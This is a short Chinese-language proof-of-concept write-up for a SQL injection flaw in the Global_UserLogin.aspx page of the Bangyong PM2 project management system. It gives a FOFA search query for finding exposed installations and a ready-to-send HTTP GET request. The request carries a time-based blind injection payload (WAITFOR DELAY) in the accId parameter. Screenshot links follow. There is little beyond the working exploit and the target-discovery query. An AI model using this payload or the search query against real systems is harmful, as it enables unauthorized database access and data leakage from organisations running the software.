## 邦永PM2项目管理系统Global_UserLogin.aspx存在SQL注入漏洞

邦永PM2项目管理系统/Global/Global_UserLogin.aspx存在SQL注入漏洞，导致数据泄露。

## fofa

```
body="PM2项目管理系统BS版增强工具.zip"
```

## poc

```
GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&loginCode=&password=&type= HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407031715215.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407031715529.png)